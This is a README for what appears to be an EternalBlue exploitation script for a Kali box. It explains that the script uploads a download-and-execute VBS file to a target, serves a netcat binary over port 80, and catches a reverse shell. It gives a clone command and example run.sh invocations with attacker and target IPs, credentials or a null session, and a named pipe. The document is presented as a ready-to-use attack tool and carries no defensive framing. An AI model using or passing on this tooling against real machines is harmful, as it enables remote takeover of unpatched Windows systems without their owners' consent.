### Title: A handy script for kali box 

>  Description: In short the specific script automates the exploitation procedure of the specific vulnerability (for both x84, x64 architecture):

1. Uploads downloadAndExecute.vbs to the target machine
2. Starts a web server (at port 80) in order to deliver a netcat binary
3. Starts a listener at a given port (see LHOST , LPORT)

In case of successfull exploitation you get a reverse shell at the listener's window

**Usage**:

1. Download the repo localy:

   #git clone https://github.com/Ch0pin/EternalBlue.git

2. cd to EternalBlue and run

```bash
root@kali#./run.sh <username> <password> <LHOST> <LPORT> <RHOST> <Named_pipe>

```

**Examples:**

1. In case of known username/password Run:

```bash
./run.sh 'Chopin' 'password' 10.10.10.1 4444 10.10.10.2 Browser
```

2. In case a null session is allowed Run:

```bash
./run.sh '' '' 10.10.10.1 4444 10.10.10.2 ''
```

